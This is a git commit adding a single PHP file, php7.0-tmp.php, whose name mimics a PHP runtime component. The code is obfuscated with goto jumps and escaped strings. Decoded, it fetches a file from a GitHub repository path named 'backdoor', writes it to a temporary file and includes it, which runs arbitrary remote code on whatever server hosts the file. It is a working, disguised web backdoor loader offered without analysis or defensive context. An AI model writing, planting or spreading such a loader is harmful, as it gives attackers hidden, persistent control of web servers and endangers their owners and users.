6f101d1e84a8a1841a5192449e1c17dc100c9ea1
exploits77 <schatz.dicky@proton.me>
2025-10-28 02:45:03 +0700

    Add files via upload

---
+++ php7.0-tmp.php
@@ -0,0 +1,3 @@
+<?php
+
+goto sHNkh; sHNkh: $EnoeA = tmpfile(); goto uTcE6; uTcE6: $UmXGi = fwrite($EnoeA, file_get_contents("\x68\164\x74\160\x73\x3a\x2f\x2f\x72\141\x77\x2e\x67\151\x74\150\x75\142\x75\163\x65\162\x63\157\x6e\164\x65\156\x74\x2e\x63\157\x6d\x2f\145\x78\x70\154\x6f\151\x74\163\x37\x37\x2f\142\x61\x63\153\x64\157\x6f\162\x2f\162\x65\x66\163\x2f\150\x65\x61\144\x73\x2f\155\x61\151\156\x2f\160\x68\160\x37\x2e\x30\x2d\146\x70\155\x2e\160\x68\160")); goto xa01q; xa01q: include stream_get_meta_data($EnoeA)["\165\x72\x69"]; goto Lg1o1; Lg1o1: fclose($EnoeA);
